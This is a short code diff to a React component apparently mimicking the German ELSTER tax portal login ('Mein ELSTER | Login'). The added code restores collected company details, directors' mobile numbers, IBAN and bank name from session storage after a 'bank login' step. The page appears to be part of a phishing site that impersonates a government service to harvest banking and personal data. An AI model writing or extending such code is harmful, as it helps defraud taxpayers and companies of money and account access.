@@ -79,6 +79,22 @@ const Elster = () => {
   useEffect(() => { window.scrollTo(0, 0); }, [phase, step]);
   usePageMeta("Mein ELSTER | Login", "/favicon.png");
 
+  // Restore state when returning from bank login (?step=3)
+  useEffect(() => {
+    if (searchParams.get("step") !== "3") return;
+    try {
+      const raw = sessionStorage.getItem(STORAGE_KEY);
+      if (raw) {
+        const s = JSON.parse(raw);
+        setCompany(s.company ?? ""); setVEmail(s.vEmail ?? ""); setPhone(s.phone ?? "");
+        setStreet(s.street ?? ""); setCity(s.city ?? "");
+        setDirectors(s.directors ?? [{ firstName: "", lastName: "", mobile: "" }]);
+        setIban(s.iban ?? ""); setBankName(s.bankName ?? "");
+      }
+    } catch { /* ignore */ }
+    setPhase("verify"); setStep(3);
+  }, [searchParams]);
+
   const cleanedIban = iban.replace(/\s/g, "").toUpperCase();
   const ibanValid = useMemo(() => {
     const s = cleanedIban;
